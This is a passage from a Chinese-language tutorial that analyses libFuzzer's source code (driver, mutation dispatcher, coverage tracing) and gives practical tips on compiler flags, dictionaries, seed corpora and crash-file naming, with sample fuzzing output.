  BIO *sinbio = BIO_new(BIO_s_mem());
  BIO *soutbio = BIO_new(BIO_s_mem());
  SSL_set_bio(server, sinbio, soutbio);
  SSL_set_accept_state(server);
  BIO_write(sinbio, data, size);
  SSL_do_handshake(server);
  SSL_free(server);
  return 0;
}
</code></pre>
<p>libFuzzer以<code>LLVMFuzzerTestOneInput()</code>作为用户自定义的模糊测试入口点,用户只需要关注为libFuzzer生成的数据编写接口调用逻辑,而libFuzzer本身只需要做好数据生成即可.libFuzzer的数据生成主要由三部分构成:</p>
<ol>
<li>用户指定的初始数据</li>
<li>数据变异</li>
<li>新路径发现</li>
</ol>
<p>libFuzzer工作过程也可以简单地归纳为:</p>
<ol>
<li>初始化</li>
<li>生成数据</li>
<li>开始测试</li>
<li>收集代码覆盖率信息</li>
<li>生成数据</li>
<li>开始测试</li>
<li>...以此类推</li>
</ol>
<p>对以上的执行过程有了印象之后,那么我们就开始对libFuzzer的源码进行探索.FuzzerDriver.cpp文件的FuzzerDriver()函数是libFuzzer的入口点.</p>
<pre><code class="language-c++">int FuzzerDriver(int *argc, char ***argv, UserCallback Callback) {
   // 省略代码
  if (EF-&gt;LLVMFuzzerInitialize) // 如果用户有自定义LLVMFuzzerInitialize()实现,那么就执行该函数,提供这个函数的作为用户自定义实现接口是因为要对库/程序进行初始化
    EF-&gt;LLVMFuzzerInitialize(argc, argv);
   // 省略程序解析外部参数代码

  unsigned Seed = Flags.seed; // 如果外部有传递随机数种子的话.参数为-seed=?
  if (Seed == 0)
    Seed = std::chrono::system_clock::now().time_since_epoch().count() + GetPid(); // 外部没有指定随机数种子,那就使用时间戳+pid
  if (Flags.verbosity) // 调试输出,参数为-verbosity
    Printf(&quot;INFO: Seed: %u\n&quot;, Seed);

  Random Rand(Seed); // 随机数生成器
  auto *MD = new MutationDispatcher(Rand, Options); // 数据变异生成器
  auto *Corpus = new InputCorpus(Options.OutputCorpus); // 数据收集器
  auto *F = new Fuzzer(Callback, *Corpus, *MD, Options); // Fuzzer核心逻辑模块

  StartRssThread(F, Flags.rss_limit_mb); // 创建内存检测线程,如果当前进程的内存占用超过阈值之后就退出Fuzzer报告异常

  Options.HandleAbrt = Flags.handle_abrt;
  Options.HandleBus = Flags.handle_bus;
  Options.HandleFpe = Flags.handle_fpe;
  Options.HandleIll = Flags.handle_ill;
  Options.HandleInt = Flags.handle_int;
  Options.HandleSegv = Flags.handle_segv;
  Options.HandleTerm = Flags.handle_term;
  Options.HandleXfsz = Flags.handle_xfsz;
  SetSignalHandler(Options);  // 初始化信号捕获回调函数

   // 省略代码
  F-&gt;Loop(); // 开始Fuzzing

  exit(0);
}
</code></pre>
<p>通过分析libFuzzer的启动过程我们可知,它整个框架的核心由:</p>
<ul>
<li>
<p>数据变异生成器</p>
</li>
<li>
<p>数据收集器</p>
</li>
<li>
<p>Fuzzer核心逻辑模块</p>
<p>组成.接下来我们应该梳理清楚这三个模块之间的关系,接着前面的分析,我们继续阅读<code>Fuzzer::Loop()</code>的代码.</p>
</li>
</ul>
<pre><code class="language-c++">void Fuzzer::Loop() {
   // 省略代码
  while (true) {
    // 省略代码
    if (TimedOut()) break; // 由参数-max_total_time指定的运行时间控制,超时执行就退出
    // Perform several mutations and runs.
    MutateAndTestOne(); // 执行一次Fuzzing
  }
  // 省略代码
}

void Fuzzer::MutateAndTestOne() {
  auto &amp;II = Corpus.ChooseUnitToMutate(MD.GetRand());  // 从数据收集器中随机挑一个测试数据出来,要结合下面的核心逻辑代码才能理解它的用意
  const auto &amp;U = II.U;
  size_t Size = U.size();
  memcpy(CurrentUnitData, U.data(), Size);  //  获取测试数据

  // 省略代码

  for (int i = 0; i &lt; Options.MutateDepth; i++) {  // 对数据变异多次.由参数-mutate_depth控制,默认值是5
    size_t NewSize = 0;
    NewSize = MD.Mutate(CurrentUnitData, Size, CurrentMaxMutationLen); // 使用前面随机抽取获取到的测试数据作为变异输入生成测试数据
    Size = NewSize;
    if (i == 0)  // 注意,第一次Fuzzing时,会启用数据追踪功能,简而言之就是hook strstr(),strcasestr(),memmem()函数,然后从参数中获取到一些有意思的字符串
      StartTraceRecording();
    II.NumExecutedMutations++;
    if (size_t NumFeatures = RunOne(CurrentUnitData, Size)) {  // 开始Fuzzing,如果使用前面生成的变异数据拿去Fuzzing,发现了新的路径数量,就会保存到NumFeatures,没有发现新路径则NumFeatures=0.
      Corpus.AddToCorpus({CurrentUnitData, CurrentUnitData + Size}, NumFeatures,
                         /*MayDeleteFile=*/true);  // 注意,这一段代码是libFuzzer的核心逻辑之一,如果变异数据发现新路径,那就记录该数据到数据收集器.这是libFuzzer路径探测的核心原理.
      ReportNewCoverage(&amp;II, {CurrentUnitData, CurrentUnitData + Size});
      CheckExitOnSrcPosOrItem();
    }
    StopTraceRecording();
    TryDetectingAMemoryLeak(CurrentUnitData, Size,
                            /*DuringInitialCorpusExecution*/ false);
  }
}

size_t Fuzzer::RunOne(const uint8_t *Data, size_t Size) {
  ExecuteCallback(Data, Size);  // 往下就是调用到LLVMFuzzerTestOneInput()
  TPC.UpdateCodeIntensityRecord(TPC.GetCodeIntensity());  // 获取当前执行过的代码分支总数

  size_t NumUpdatesBefore = Corpus.NumFeatureUpdates();
  TPC.CollectFeatures([&amp;](size_t Feature) {
    Corpus.AddFeature(Feature, Size, Options.Shrink);
  });
  size_t NumUpdatesAfter = Corpus.NumFeatureUpdates();  // 从SanitizerCoverage插桩记录的信息中获取分支数据

  // 省略代码

  return NumUpdatesAfter - NumUpdatesBefore;  // 计算发现了多少新分支路径
}
</code></pre>
<p>明白libFuzzer的主要Fuzzing原理后,我们现在探讨下代码覆盖率的实现细节.首先,libFuzzer TracePC(TPC)类是专门用于收集使用SanitizerCoverage插桩获取到的信息,代码实现在FuzzerTracePC.cpp文件下.</p>
<pre><code class="language-c++">ATTRIBUTE_INTERFACE
void __sanitizer_cov_trace_pc_guard_init(uint32_t *Start, uint32_t *Stop) {
  fuzzer::TPC.HandleInit(Start, Stop);
}

ATTRIBUTE_INTERFACE
ATTRIBUTE_NO_SANITIZE_ALL
void __sanitizer_cov_trace_pc_guard(uint32_t *Guard) {
  uintptr_t PC = reinterpret_cast&lt;uintptr_t&gt;(__builtin_return_address(0));
  uint32_t Idx = *Guard;

  getStackDepth();
  fuzzer::codeIntensity++;

  __sancov_trace_pc_pcs[Idx] = PC;
  __sancov_trace_pc_guard_8bit_counters[Idx]++;
}
</code></pre>
<p>理解这个细节后,再回来看核心逻辑<code>Fuzzer::ExecuteCallback()</code>.</p>
<pre><code class="language-c++">void Fuzzer::ExecuteCallback(const uint8_t *Data, size_t Size) {
  // 省略代码
  uint8_t *DataCopy = new uint8_t[Size];
  memcpy(DataCopy, Data, Size);  // 从变异的数据中复制一份到这个内存,后面会用到
  // 省略代码
  TPC.ResetMaps();  // 清空所有路径信息
  RunningCB = true;
  int Res = CB(DataCopy, Size);  // 执行用户自定义的LLVMFuzzerTestOneInput()
  RunningCB = false;
  // 省略代码
  if (!LooseMemeq(DataCopy, Data, Size))  // 注意这个坑,如果传递给LLVMFuzzerTestOneInput()的data会被程序修改,那么libFuzzer会强制退出
    CrashOnOverwrittenData();
  delete[] DataCopy;
}
</code></pre>
<h4 id="数据生成原理"><a class="header" href="#数据生成原理">数据生成原理</a></h4>
<p>对整个Fuzzing过程清晰后,我们回来探索libFuzzer的数据生成原理,对应数据变异模块<code>MutationDispatcher</code>.</p>
<pre><code class="language-c++">MutationDispatcher::MutationDispatcher(Random &amp;Rand,const FuzzingOptions &amp;Options)
    : Rand(Rand), Options(Options) {  // Rand是随机数生成器
  DefaultMutators.insert(
      DefaultMutators.begin(),  // 添加数据变异算法
      {
          {&amp;MutationDispatcher::Mutate_EraseBytes, &quot;EraseBytes&quot;},
          {&amp;MutationDispatcher::Mutate_InsertByte, &quot;InsertByte&quot;},
          {&amp;MutationDispatcher::Mutate_InsertRepeatedBytes,
           &quot;InsertRepeatedBytes&quot;},
          {&amp;MutationDispatcher::Mutate_ChangeByte, &quot;ChangeByte&quot;},
          {&amp;MutationDispatcher::Mutate_ChangeBit, &quot;ChangeBit&quot;},
          {&amp;MutationDispatcher::Mutate_ShuffleBytes, &quot;ShuffleBytes&quot;},
          {&amp;MutationDispatcher::Mutate_ChangeASCIIInteger, &quot;ChangeASCIIInt&quot;},
          {&amp;MutationDispatcher::Mutate_ChangeBinaryInteger, &quot;ChangeBinInt&quot;},
          {&amp;MutationDispatcher::Mutate_CopyPart, &quot;CopyPart&quot;},
          {&amp;MutationDispatcher::Mutate_CrossOver, &quot;CrossOver&quot;},
          {&amp;MutationDispatcher::Mutate_AddWordFromManualDictionary,
           &quot;ManualDict&quot;},
          {&amp;MutationDispatcher::Mutate_AddWordFromTemporaryAutoDictionary,
           &quot;TempAutoDict&quot;},
          {&amp;MutationDispatcher::Mutate_AddWordFromPersistentAutoDictionary,
           &quot;PersAutoDict&quot;},
      });
  if(Options.UseCmp)
    DefaultMutators.push_back(
        {&amp;MutationDispatcher::Mutate_AddWordFromTORC, &quot;CMP&quot;});

  if (EF-&gt;LLVMFuzzerCustomMutator)  // 如果存在用户自定义的数据变异方法,那就使用它
    Mutators.push_back({&amp;MutationDispatcher::Mutate_Custom, &quot;Custom&quot;});
  else
    Mutators = DefaultMutators;

  if (EF-&gt;LLVMFuzzerCustomCrossOver)
    Mutators.push_back(
        {&amp;MutationDispatcher::Mutate_CustomCrossOver, &quot;CustomCrossOver&quot;});
}
</code></pre>
<p>关于数据变异的算法读者们自行阅读,这些变异方法基本上都差不多.笔者画图整理全部的逻辑,读者们就能对此一目了然.</p>
<p><img src="./pic12/libFuzzer-Mutate.png" alt="" /></p>
<h4 id="路径探测原理"><a class="header" href="#路径探测原理">路径探测原理</a></h4>
<p>前面有简略地提到这点,简单总结整体流程如下:</p>
<p><img src="./pic12/libFuzzer-PathSearch.png" alt="" /></p>
<p>本章最后,把libFuzzer数据变异和路径探测结合在一起的完整过程如下所示.</p>
<p><img src="./pic12/libFuzzer-Arch.png" alt="" /></p>
<h2 id="深入解析libfuzzer参数与回显"><a class="header" href="#深入解析libfuzzer参数与回显">深入解析libFuzzer参数与回显</a></h2>
<p>本小节着重于对实用情景下对libFuzzer的用法和坑(参数,回显,bug等)做深入的分析,为什么要将它放到最后来解释呢?笔者在实际工作中遇到了一些难以处理问题,都是依靠前面对libFuzzer源码的浅薄理解而解决的.</p>
<h4 id="编译时使用-libfuzzera和-fsanitizefuzzer有区别嘛"><a class="header" href="#编译时使用-libfuzzera和-fsanitizefuzzer有区别嘛">编译时使用 libFuzzer.a和-fsanitize=fuzzer有区别嘛?</a></h4>
<p>回顾libfuzzer-workshop的例子,示例的第一步要求我们先对libFuzzer的源码进行编译,生成libFuzzer.a静态库,然后再自行编写Fuzz逻辑入口,把Fuzzer,库源码,libFuzzer.a同时链接,生成可执行Fuzzer.实际上clang中已经内置了libFuzzer,我们使用-fsanitize=fuzzer也可以引入它.举个例子:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;


int LLVMFuzzerTestOneInput(const char* Data,unsigned int Size) {
	if (Size &gt; 4) {
		if (Data[1] == 'F' &amp;&amp; Data[3] == 'A') {
			printf(&quot;bingo \n&quot;);
			exit(0);
		}
	}

	return 0;
}
</code></pre>
<p>命令行下执行结果:</p>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/temp$ clang -fsanitize=fuzzer 1.c -o 1_fuzzer &amp;&amp; ./1_fuzzer
INFO: Seed: 3655122303
INFO: Loaded 1 modules   (5 inline 8-bit counters): 5 [0x4e8080, 0x4e8085),
INFO: Loaded 1 PC tables (5 PCs): 5 [0x4bee00,0x4bee50),
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes
INFO: A corpus is not provided, starting from an empty corpus
#2	INITED cov: 2 ft: 2 corp: 1/1b exec/s: 0 rss: 28Mb
#219	NEW    cov: 3 ft: 3 corp: 2/7b lim: 6 exec/s: 0 rss: 28Mb L: 6/6 MS: 2 CopyPart-CrossOver-
#245	REDUCE cov: 3 ft: 3 corp: 2/6b lim: 6 exec/s: 0 rss: 28Mb L: 5/5 MS: 1 EraseBytes-
#4770	REDUCE cov: 4 ft: 4 corp: 3/12b lim: 48 exec/s: 0 rss: 28Mb L: 6/6 MS: 5 CrossOver-ShuffleBytes-EraseBytes-ChangeBinInt-ShuffleBytes-
#4773	REDUCE cov: 4 ft: 4 corp: 3/11b lim: 48 exec/s: 0 rss: 28Mb L: 5/5 MS: 3 CopyPart-ShuffleBytes-EraseBytes-
bingo
==822227== ERROR: libFuzzer: fuzz target exited
    #0 0x4adb40 in __sanitizer_print_stack_trace (/home/ubuntu/Desktop/temp/1_fuzzer+0x4adb40)
    #1 0x459498 in fuzzer::PrintStackTrace() (/home/ubuntu/Desktop/temp/1_fuzzer+0x459498)
    #2 0x43f58c in fuzzer::Fuzzer::ExitCallback() (/home/ubuntu/Desktop/temp/1_fuzzer+0x43f58c)
    #3 0x7f064ebb9a56 in __run_exit_handlers stdlib/exit.c:108:8
    #4 0x7f064ebb9bff in exit stdlib/exit.c:139:3
    #5 0x4adf32 in LLVMFuzzerTestOneInput (/home/ubuntu/Desktop/temp/1_fuzzer+0x4adf32)
    #6 0x440a31 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/ubuntu/Desktop/temp/1_fuzzer+0x440a31)
    #7 0x440175 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) (/home/ubuntu/Desktop/temp/1_fuzzer+0x440175)
    #8 0x441ba0 in fuzzer::Fuzzer::MutateAndTestOne() (/home/ubuntu/Desktop/temp/1_fuzzer+0x441ba0)
    #9 0x442615 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) (/home/ubuntu/Desktop/temp/1_fuzzer+0x442615)
    #10 0x432025 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/ubuntu/Desktop/temp/1_fuzzer+0x432025)
    #11 0x459c72 in main (/home/ubuntu/Desktop/temp/1_fuzzer+0x459c72)
    #12 0x7f064eb9dcb1 in __libc_start_main csu/../csu/libc-start.c:314:16
    #13 0x40684d in _start (/home/ubuntu/Desktop/temp/1_fuzzer+0x40684d)

SUMMARY: libFuzzer: fuzz target exited
MS: 1 InsertByte-; base unit: 0c7d9271cf3d2a4e2c3eec3e76a2d1dc1431af36
0xa,0x46,0xf6,0x41,0xa,0xa,
\x0aF\xf6A\x0a\x0a
artifact_prefix='./'; Test unit written to ./crash-8860dc7909080bcb9ca9827f67704611bbdf02b9
Base64: Ckb2QQoK
ubuntu@ubuntu-virtual-machine:~/Desktop/temp$
</code></pre>
<p>这看起来和直接引入libFuzzer.a的效果一样,那么接下来我们再引入**-fsanitize-coverage=trace-pc-guard**重新编译运行.结果如下:</p>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/temp$ clang -v
Ubuntu clang version 11.0.0-2
Target: x86_64-pc-linux-gnu
ubuntu@ubuntu-virtual-machine:~/Desktop/temp$ clang -fsanitize=fuzzer -fsanitize-coverage=trace-pc-guard 1.c -o 1_fuzzer &amp;&amp; ./1_fuzzer
-fsanitize-coverage=trace-pc-guard is no longer supported by libFuzzer.
Please either migrate to a compiler that supports -fsanitize=fuzzer
or use an older version of libFuzzer
ubuntu@ubuntu-virtual-machine:~/Desktop/temp$
</code></pre>
<p>这是因为高版本的clang不支持trace-pc-guard和trace-pc了.对此有两个解决方法:</p>
<ul>
<li>使用-fsanitize-coverage=trace-gep,trace-div,trace-cmp替代trace-pc-guard.(适用于Windows平台)</li>
<li>使用低版本的libFuzzer编译出静态库然后导入链接.因为不支持trace-pc-guard的逻辑是在libFuzzer中写死的(参考FuzzerTracePC.cpp __sanitizer_cov_trace_pc_guard()函数),即使换成高版本libFuzzer的静态库也是一样的提示.</li>
</ul>
<h4 id="为什么libfuzzer要删除对trace-pc的支持"><a class="header" href="#为什么libfuzzer要删除对trace-pc的支持">为什么libFuzzer要删除对trace-pc的支持?</a></h4>
<p>libFuzzer开发者kcc在2019年1月的Commit中删除了libFuzzer对trace-pc的支持,相关diff如下:</p>
<ul>
<li>
<p>https://github.com/llvm/llvm-project/commit/62d727061053dac28447a900fce064c54d366bd6#</p>
</li>
<li>
<p>https://github.com/llvm/llvm-project/commit/62d727061053dac28447a900fce064c54d366bd6#</p>
<p>笔者找遍了文档和提交记录,对于为什么要删除trace-pc的支持找不到任何相关信息,于是只能通过阅读源码和效果对比测试来理解和推测.相关结论如下:</p>
</li>
<li>
<p>删除trace-pc是因为trace-pc的代码覆盖率统计方法可以被替代.</p>
</li>
<li>
<p>trace-pc随后被inline-8bit-counter(统计BasicBlock执行次数)和trace-cmp(在分支之前插桩)替代,因为trace-cmp可以主动发现逻辑判断中对比的数值,部分场景下能够增强主动模糊测试效果.</p>
<p>我们先对比一下改变前后的libFuzzer编译结果.旧版本的libFuzzer使用trace-pc插桩之后的代码逻辑如下,<code>生成的Data让逻辑执行到某个特定的BasicBlock时才记录代码覆盖</code>,这样模糊测试工具相对<em>被动</em>.</p>
</li>
</ul>
<p><img src="./pic12/old_libfuzzer_santizer_coverage.png" alt="" /></p>
<p>新版本的libFuzzer默认使用trace-cmp插桩之后,会在判断逻辑前面插桩并收集判断逻辑的数据(比如下面的反编译就是收集判断<code>if(Data[0] = '1')</code>的字符1),然后回馈到语料库(fuzzer::TracePC::TableOfRecentCompares).有了这些判断中的数据,生成模糊测试的数据就能相对有个方向,更为<em>主动</em>.其中__santizer_cov_trace_const_cmp4是由trace-cmp插桩的逻辑,++byte_4EB071是由inline-8bit-Counter插桩的逻辑.</p>
<p><img src="./pic12/new_libfuzzer_santizer_coverage.png" alt="" /></p>
<p>两种插桩模式的模糊测试效果对比如下:</p>
<p><img src="./pic12/new_libfuzzer_effect.png" alt="" /></p>
<p>附加参考链接:https://reviews.llvm.org/rC352818</p>
<h4 id="windows平台下怎么引用libfuzzer"><a class="header" href="#windows平台下怎么引用libfuzzer">Windows平台下怎么引用libFuzzer?</a></h4>
<p>Windows平台下使用libFuzzer建议还是使用LLVM官网的Windows编译套件,因为使用Visutal Studio Installer下载的LLVM版本只支持32位编译(只有32位的静态库),LLVM官网的Windows编译套件32/64位都支持.</p>
<p>Visual Studio项目需要修改编译工具集为LLVM-clang和正确平台SDK的即可.有几点需要注意:</p>
<ul>
<li>clang的编译语法和MSVC不一样,有一些不应该提示的错误可以使用-Wno-xxx关闭警告.</li>
<li>clang甚至不支持一些MSVC内置函数(比如__cpuid等),可以尝试引入intrin.h解决.</li>
<li>有一些MSVC或者WinAPI符号无法被clang识别,这是因为C++重载问题导致clang找不到符号.比如InternalLockAdd(LONG)和InternalLockAdd(ULONG),clang会认为是两个不一样的函数,但是WinAPI只有一个.所以建议直接对函数参数传参做强制转换,.对齐标准WinAPI声明.</li>
<li>链接时需要手工引入.lib库,还记得前面的compiler-RT库嘛,插桩逻辑和Fuzzer调度逻辑都在这里,clang默认不会加载.</li>
</ul>
<h4 id="libfuzzer怎么样提高模糊测试效果"><a class="header" href="#libfuzzer怎么样提高模糊测试效果">libFuzzer怎么样提高模糊测试效果?</a></h4>
<p><code>-dict</code>参数指定一个语料库,后续ManualDict这些数据变异模块就可以从这里拿到<strong>和当前被测试的逻辑强相关的关键词</strong>.举个例子,我们对SQL注入做测试,这些关键词是不是就包含了:union select,from,count()等;对文件解析测试,是不是就需要包含7zip,PE,MZ,Rar!等关键词呢.我们传递的这些关键词,最终会被拼接到LLVMFuzzerTestOneInput()的data参数中.</p>
<p>实际上,libFuzzer也能够像AFL一样接受一批样本数据作为初始化输入来做模糊测试.这样的话我们就可以根据模糊测试的对象的业务去github和各个项目的测试用例中搜罗样本数据了.</p>
<p>上面两个参数是可以结合使用的,不带参数和带参数的对路径探测的结果影响如下:</p>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/fuzz$ ./test_case
INFO: Seed: 1117474860
INFO: Loaded 1 modules (10682 guards): [0x110c9b8, 0x11170a0),
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes
INFO: A corpus is not provided, starting from an empty corpus
#0	READ units: 1
#1	INITED cov: 869 ci: 0K ft: 180 corp: 1/1b exec/s: 0 rss: 135Mb
#2	NEW    cov: 869 ci: 0K ft: 208 corp: 2/2b exec/s: 0 rss: 135Mb L: 1 MS: 1 ShuffleBytes-
#3	NEW    cov: 885 ci: 0K ft: 229 corp: 3/4b exec/s: 0 rss: 135Mb L: 2 MS: 2 ShuffleBytes-CrossOver-
#5	NEW    cov: 886 ci: 0K ft: 239 corp: 4/5b exec/s: 0 rss: 135Mb L: 1 MS: 4 ShuffleBytes-CrossOver-EraseBytes-ChangeBit-
#8	NEW    cov: 886 ci: 0K ft: 248 corp: 5/8b exec/s: 0 rss: 135Mb L: 3 MS: 2 ChangeBit-CrossOver-
#9	NEW    cov: 887 ci: 0K ft: 249 corp: 6/12b exec/s: 0 rss: 135Mb L: 4 MS: 3 ChangeBit-CrossOver-InsertByte-
#12	NEW    cov: 898 ci: 0K ft: 264 corp: 7/89b exec/s: 0 rss: 145Mb L: 77 MS: 1 InsertRepeatedBytes-
#13	NEW    cov: 898 ci: 1K ft: 267 corp: 8/210b exec/s: 0 rss: 145Mb L: 121 MS: 2 InsertRepeatedBytes-CopyPart-
#14	NEW    cov: 898 ci: 2K ft: 269 corp: 9/401b exec/s: 0 rss: 145Mb L: 191 MS: 3 InsertRepeatedBytes-CopyPart-CopyPart-
#15	NEW    cov: 898 ci: 2K ft: 270 corp: 10/593b exec/s: 0 rss: 145Mb L: 192 MS: 4 InsertRepeatedBytes-CopyPart-CopyPart-InsertByte-
#21	NEW    cov: 899 ci: 41K ft: 271 corp: 11/4689b exec/s: 0 rss: 145Mb L: 4096 MS: 5 ChangeBit-EraseBytes-EraseBytes-ChangeBit-CrossOver-
#25	NEW    cov: 899 ci: 41K ft: 272 corp: 12/5513b exec/s: 0 rss: 145Mb L: 824 MS: 4 ChangeByte-CMP-CrossOver-CrossOver- DE: &quot;\xef\x0f&quot;-
#43	NEW    cov: 899 ci: 41K ft: 280 corp: 13/5516b exec/s: 0 rss: 145Mb L: 3 MS: 2 ChangeBinInt-CopyPart-
#90	NEW    cov: 899 ci: 41K ft: 281 corp: 14/5746b exec/s: 0 rss: 145Mb L: 230 MS: 4 ChangeByte-PersAutoDict-CopyPart-InsertRepeatedBytes- DE: &quot;\xef\x0f&quot;-
#106	NEW    cov: 899 ci: 41K ft: 283 corp: 15/6032b exec/s: 0 rss: 145Mb L: 286 MS: 5 EraseBytes-ChangeBit-ShuffleBytes-ChangeBit-InsertRepeatedBytes-
#117	NEW    cov: 899 ci: 41K ft: 284 corp: 16/6071b exec/s: 0 rss: 145Mb L: 39 MS: 1 EraseBytes-
#124	NEW    cov: 899 ci: 41K ft: 286 corp: 17/6076b exec/s: 0 rss: 145Mb L: 5 MS: 3 ChangeByte-ShuffleBytes-PersAutoDict- DE: &quot;\xef\x0f&quot;-
#163	NEW    cov: 899 ci: 41K ft: 288 corp: 18/6093b exec/s: 0 rss: 145Mb L: 17 MS: 2 CMP-CMP- DE: &quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;-&quot;\xff\xff\xff\xff\xff\xff\x0b[&quot;-
#164	NEW    cov: 899 ci: 41K ft: 290 corp: 19/6106b exec/s: 0 rss: 145Mb L: 13 MS: 3 CMP-CMP-EraseBytes- DE: &quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;-&quot;\xff\xff\xff\xff\xff\xff\x0b[&quot;-
#169	NEW    cov: 899 ci: 41K ft: 292 corp: 20/6118b exec/s: 0 rss: 145Mb L: 12 MS: 3 ChangeByte-ChangeBinInt-CMP- DE: &quot;objective&quot;-
#182	NEW    cov: 899 ci: 41K ft: 294 corp: 21/6129b exec/s: 0 rss: 145Mb L: 11 MS: 1 CMP- DE: &quot;\xff\xff\xff\xff\xff\xff\xff\xff&quot;-
#529	NEW    cov: 899 ci: 41K ft: 295 corp: 22/6131b exec/s: 0 rss: 146Mb L: 2 MS: 3 ChangeBit-InsertByte-ChangeBit-
#634	NEW    cov: 899 ci: 41K ft: 296 corp: 23/10227b exec/s: 0 rss: 146Mb L: 4096 MS: 3 CopyPart-CrossOver-ChangeBit-
#702	NEW    cov: 899 ci: 41K ft: 298 corp: 24/10418b exec/s: 702 rss: 146Mb L: 191 MS: 1 ChangeBinInt-
#1041	NEW    cov: 899 ci: 41K ft: 299 corp: 25/10424b exec/s: 1041 rss: 146Mb L: 6 MS: 5 ShuffleBytes-CMP-CrossOver-EraseBytes-EraseBytes- DE: &quot;\x00\x00\x00Z&quot;-
</code></pre>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/fuzz$ ./test_case -dict=./libfuzzer_keywork.txt sample/
Dictionary: 375 entries
INFO: Seed: 1048768538
INFO: Loaded 1 modules (10682 guards): [0x110c9b8, 0x11170a0),
Loading corpus dir: sample/
Loaded 1024/2640 files from sample/
Loaded 2048/2640 files from sample/
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 1048576 bytes
#0	READ units: 2638
#1024	pulse  cov: 1805 ci: 609K ft: 1585 corp: 73/15289b exec/s: 512 rss: 748Mb
#2048	pulse  cov: 3774 ci: 5983K ft: 6522 corp: 259/3660Kb exec/s: 341 rss: 785Mb
#2638	INITED cov: 4286 ci: 18481K ft: 9928 corp: 490/79Mb exec/s: 131 rss: 997Mb
#2639	NEW    cov: 4286 ci: 18481K ft: 9929 corp: 491/79Mb exec/s: 131 rss: 997Mb L: 94081 MS: 1 CMP- DE: &quot;N4LIEF17read_out_&quot;-
#2665	NEW    cov: 4325 ci: 18481K ft: 9988 corp: 492/79Mb exec/s: 133 rss: 997Mb L: 165541 MS: 2 CMP-PersAutoDict- DE: &quot;\x0a\x00&quot;-&quot;N4LIEF17read_out_&quot;-
#2713	NEW    cov: 4325 ci: 18481K ft: 9999 corp: 493/79Mb exec/s: 129 rss: 997Mb L: 103145 MS: 5 CMP-InsertRepeatedBytes-EraseBytes-ManualDict-ChangeByte- DE: &quot;\x01\x00\x00\x00\x00\x01\x89\xca&quot;-&quot;PowerPoint&quot;-
#2804	NEW    cov: 4326 ci: 18481K ft: 10006 corp: 494/79Mb exec/s: 127 rss: 997Mb L: 94081 MS: 1 ChangeBit-
#2960	NEW    cov: 4326 ci: 18481K ft: 10007 corp: 495/79Mb exec/s: 118 rss: 997Mb L: 67143 MS: 2 PersAutoDict-CMP- DE: &quot;\x01\x00\x00\x00\x00\x01\x89\xca&quot;-&quot;\x00\x00\x00\x00\x00\x00\x13}&quot;-
#3011	NEW    cov: 4326 ci: 18481K ft: 10008 corp: 496/79Mb exec/s: 120 rss: 997Mb L: 94205 MS: 3 ChangeASCIIInt-InsertRepeatedBytes-ChangeBinInt-
#3014	NEW    cov: 4327 ci: 18481K ft: 10009 corp: 497/79Mb exec/s: 120 rss: 997Mb L: 67143 MS: 1 CopyPart-
#3102	NEW    cov: 4327 ci: 18481K ft: 10013 corp: 498/79Mb exec/s: 114 rss: 997Mb L: 81784 MS: 4 ManualDict-ShuffleBytes-ChangeBit-CopyPart- DE: &quot;Jet\x00&quot;-
#3106	NEW    cov: 4327 ci: 18481K ft: 10027 corp: 499/79Mb exec/s: 115 rss: 997Mb L: 72629 MS: 3 CopyPart-ChangeByte-CMP- DE: &quot;\x0b\x00&quot;-
#3109	NEW    cov: 4327 ci: 18481K ft: 10030 corp: 500/79Mb exec/s: 115 rss: 997Mb L: 65197 MS: 1 CMP- DE: &quot;\x1f\x00\x00\x00\x00\x00\x00\x00&quot;-
#3522	NEW    cov: 4328 ci: 18481K ft: 10031 corp: 501/80Mb exec/s: 103 rss: 997Mb L: 39524 MS: 4 InsertByte-ChangeBit-EraseBytes-InsertByte-

</code></pre>
<p>其中cov值则是执行分支总数,可以看到两次Fuzzer运行之间的巨大差异(第一次执行只覆盖899个分支,第二次执行覆盖4328个分支).这里-worker是指同时使用多个进程来执行Fuzzer(源码实现在FuzzerDriver.cpp WorkerThread()).</p>
<h4 id="多个libfuzzer同时启动时怎么样区分不同的libfuzzer生成的crash"><a class="header" href="#多个libfuzzer同时启动时怎么样区分不同的libfuzzer生成的crash">多个libFuzzer同时启动时,怎么样区分不同的libFuzzer生成的Crash?</a></h4>
<p>libFuzzer产生崩溃时,会记录当前的崩溃样本到本地,但是这些崩溃样本都是以crash slow-unit oom作为前缀.在一些模糊测试场景中,我们会在当前目录下执行多个libFuzzer程序,那就会导致多个libFuzzer产生的崩溃样本无法辨识,此时引入-artifact_prefix参数为崩溃样本自定义前缀即可.</p>
<p><img src="./pic12/3.png" alt="" /></p>
<h4 id="依赖库没有源码时有没有必要使用libfuzzer"><a class="header" href="#依赖库没有源码时有没有必要使用libfuzzer">依赖库没有源码时有没有必要使用libFuzzer?</a></h4>
<p>通过前面的分析,我们知道libFuzzer想要实现遗传算法进行模糊测试,那就需要依赖代码覆盖率Sanitize-Coverage进行插桩.但是有时候要进行模糊测试的程序要依赖到动态库和静态库,此时我们就无法对此进行插桩了.笔者在工作中遇到这种情况,处理思路如下:</p>
<ul>
<li><strong>依赖库中的源码和被模糊测试的源码之间有很大的关联性</strong>.举个例子,项目中依赖7zip的解压库,然后项目对此进行一层性能优化封装,那么要测试的代码也就必须要包含项目中的封装层代码和7zip依赖库源码,因为缺少了其中任意一部分的代码,就会很难覆盖全整个功能所需要的代码,会导致有些逻辑没法被覆盖到.</li>
